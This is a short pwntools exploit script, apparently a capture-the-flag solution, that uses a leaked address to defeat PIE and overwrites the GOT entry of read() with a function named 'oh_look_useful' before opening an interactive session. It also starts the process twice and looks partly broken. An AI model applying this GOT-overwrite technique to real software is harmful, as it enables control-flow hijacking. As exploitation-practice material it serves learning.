from pwn import *

context.binary = "./challenge"
p = process()

e = context.binary
p = process()

main_address = p.u32()

log.info(f"leaked main address {hex(main_address)}")

base_address = main_address - e.functions["main"].address

log.info(f"executable base {hex(base_address)}")

e.address += base_address

log.info(f"read() address {hex(e.got['read'])}")
log.info(f"target function address {hex(e.functions['oh_look_useful'].address)}")

p.send(p32(e.got["read"]))
p.send(p32(e.functions["oh_look_useful"].address))
p.recvline()
p.interactive()
